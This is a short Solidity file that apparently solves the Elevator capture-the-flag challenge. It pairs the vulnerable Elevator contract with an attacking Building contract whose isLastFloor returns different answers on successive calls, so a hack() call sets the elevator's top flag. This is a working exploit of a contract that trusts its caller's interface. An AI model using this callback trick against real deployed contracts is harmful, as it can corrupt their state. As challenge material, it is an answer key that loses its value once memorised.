// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Building {
    bool public forward = false;
    Elevator public elevatorAddr;

    constructor(address _elevatorAddr) {
        elevatorAddr = Elevator(_elevatorAddr);
    }

    function isLastFloor(uint) external returns (bool) {
        if (!forward) {
            forward = true;
            return false;
        }
        return true;
    }

    function hack() public {
        elevatorAddr.goTo(1);
    }
}

contract Elevator {
    bool public top;
    uint public floor;

    function goTo(uint _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
